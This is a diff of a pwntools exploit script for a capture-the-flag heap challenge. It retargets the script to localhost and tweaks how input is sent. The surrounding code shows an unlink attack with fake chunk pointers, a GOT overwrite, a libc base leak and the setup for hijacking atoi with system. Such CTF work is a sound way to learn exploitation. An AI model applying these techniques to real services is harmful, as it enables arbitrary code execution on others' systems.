@@ -2,8 +2,8 @@ from pwn import *
 from time import sleep
 context.arch = 'amd64'
 
-r = remote('csie.ctf.tw',10138)
-#r = remote('localhost',8888)
+#r = remote('csie.ctf.tw',10138)
+r = remote('localhost',8888)
 
 #r.interactive()
 size = '64'
@@ -15,7 +15,7 @@ def add_item(size,name):
     r.recvuntil(':')
     r.sendline(str(size))
     r.recvuntil(':')
-    r.sendline(name)
+    r.send(name)
 def show():
     r.recvuntil(':')
     r.sendline('1')
@@ -27,7 +27,7 @@ def change(idx,size,name):
     r.recvuntil(':')
     r.sendline(str(size))
     r.recvuntil(':')
-    r.sendline(name)
+    r.send(name)
 def remove(idx):
     r.recvuntil(':')
     r.sendline('4')
@@ -44,7 +44,6 @@ prev_size = 0
 size = 0x81
 fd = 0x6020d8-0x18
 bk = 0x6020d8-0x10
-
 chunk1 = flat([prev_size,size,fd,bk]) + 'x'*0x60
 
 #chunk2 header 
@@ -67,16 +66,13 @@ pay = flat([0x123,atoi_got])
 change(1,0x123,pay)
 
 
-
 show()
 #leak libc base
 atoi_off = 0x36e80
 r.recvuntil('0 : ')
-sleep(0.1)
 libc = u64( r.recv(8)[:-2].ljust(8,'\x00') ) - atoi_off
 
 print 'libc base : %s' % hex(libc)
-
 
 #hijack atoi with system
 sys_off = 0x45390
